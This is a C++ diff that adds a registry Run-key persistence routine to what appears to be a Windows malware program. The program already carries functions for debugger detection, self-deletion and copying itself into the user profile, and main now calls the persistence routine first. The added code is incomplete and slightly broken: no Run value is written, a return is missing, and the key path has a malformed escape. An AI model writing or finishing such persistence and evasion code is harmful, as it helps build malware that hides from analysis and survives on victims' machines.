@@ -70,6 +70,46 @@ int SelfKurtCobain(void)
 	return EXIT_SUCCESS;
 }
 
+void PrintLastErrorMessage()
+{
+	DWORD errorCode = GetLastError();
+	LPWSTR errorMsg = nullptr;
+
+	FormatMessageW(
+		FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+		NULL,
+		errorCode,
+		0, 
+		(LPWSTR)&errorMsg,
+		0,
+		NULL
+	);
+
+	if (errorMsg)
+	{
+		std::wcout << L"Error code: " << errorCode << L"\nMessage: " << errorMsg << std::endl;
+		LocalFree(errorMsg); 
+	}
+	else
+	{
+		std::wcout << L"Unknown error code: " << errorCode << std::endl;
+	}
+}
+
+int Persistence(void)
+{
+	HKEY hKey = NULL;
+	int lstatus = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
+	if (lstatus != ERROR_SUCCESS)
+	{
+		PrintLastErrorMessage();
+		return EXIT_FAILURE;
+	}
+
+	std::cout << "Registry key opened successfully!" << std::endl;
+	std::cout << hKey << std::endl;
+}
+
 int DoubleItSelf(void)
 {
 	wchar_t* userProfile = nullptr;
@@ -121,6 +161,7 @@ int CopyExists(void)
 
 int main(void)
 {
+	Persistence();
 	if (IsDebugged())
 	{
 		SelfKurtCobain();
